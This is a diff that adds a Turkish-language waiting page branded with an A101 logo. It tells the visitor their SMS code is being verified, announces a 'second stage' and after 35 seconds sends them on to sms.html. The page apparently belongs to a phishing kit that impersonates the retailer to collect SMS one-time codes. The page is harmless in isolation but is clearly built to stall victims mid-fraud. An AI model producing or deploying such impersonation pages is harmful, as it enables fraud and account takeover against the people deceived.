@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bekleyin...</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to bottom right, #2CBAD3, #2498b3);
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .waiting-container {
+            background: #fff;
+            border: none;
+            border-radius: 20px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            padding: 30px;
+            width: 400px;
+            max-width: 90%; /* Mobil cihazlar için genişlik sınırı */
+            text-align: center;
+        }
+        .waiting-container img {
+            max-width: 150px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+        .waiting-container h1 {
+            color: #2CBAD3;
+            font-size: 26px;
+            margin-bottom: 15px;
+        }
+        .waiting-container p {
+            font-size: 18px;
+            color: #2498b3;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .waiting-container .instruction {
+            font-size: 20px;
+            color: #2CBAD3;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        /* Dönen animasyonlu yükleme GIF */
+        .loading-gif {
+            width: 50px;
+            height: 50px;
+            margin-top: 20px;
+            animation: rotate 1s linear infinite;
+        }
+
+        /* Dönen animasyon */
+        @keyframes rotate {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Mobil Uyumluluk */
+        @media (max-width: 768px) {
+            .waiting-container {
+                padding: 20px;
+                border-radius: 15px;
+            }
+            .waiting-container h1 {
+                font-size: 22px;
+            }
+            .waiting-container p {
+                font-size: 16px;
+            }
+            .waiting-container .instruction {
+                font-size: 18px;
+            }
+            .loading-gif {
+                width: 40px;
+                height: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="waiting-container">
+        <img src="https://www.evrensel.net/images/840/upload/dosya/181542.jpg" alt="A101 Logosu">
+        <h1>İşleminiz Devam Ediyor...</h1>
+        <p>SMS kodunuzu doğrulamak için lütfen bekleyin.</p>
+        
+        <!-- Dönen yükleme GIF'i -->
+        <img class="loading-gif" src="https://cdn.pixabay.com/animation/2023/08/11/21/18/21-18-05-265_512.gif" alt="Yükleniyor">
+
+        <div class="instruction">2. aşama doğrulama için bekleyiniz</div>
+    </div>
+
+    <script>
+        // 22 saniye bekleme süresi
+        setTimeout(function() {
+            window.location.href = "sms.html"; // 22 saniye sonra sms.html sayfasına yönlendir
+        }, 35000); // 35 saniye
+    </script>
+</body>
+</html>
